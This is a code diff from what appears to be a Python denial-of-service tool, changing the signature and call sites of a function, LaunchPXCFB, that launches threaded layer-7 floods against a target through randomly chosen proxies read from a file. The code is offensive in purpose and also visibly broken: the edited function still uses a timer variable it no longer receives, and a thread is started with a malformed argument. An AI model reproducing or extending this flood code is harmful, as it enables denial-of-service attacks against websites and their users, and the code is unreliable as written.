@@ -1174,7 +1174,7 @@ def attackPXCFB(target, t, threads):
     for i in range(int(threads)):
         threading.Thread(target=LaunchPXCFB, args=(target)).start()
 
-def LaunchPXCFB(target, t):
+def LaunchPXCFB(target):
     prox = open("./http.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(t)
@@ -1729,7 +1729,7 @@ def welcome():
             target, thread, t = get_info_l7()
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
-            LaunchPXCFB(target, thread, t)
+            LaunchPXCFB(target)
             timer.join()
     elif "pps" in cmdl or 'PPS' in cmdl:
         target, thread, t = get_info_l7()
@@ -1976,7 +1976,7 @@ if __name__ == '__main__':
         if get_proxies():
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
-            LaunchPXCFB(target, thread)
+            LaunchPXCFB(target)
             timer.join()
     elif method == "get":
         timer = threading.Thread(target=countdown, args=(t,))
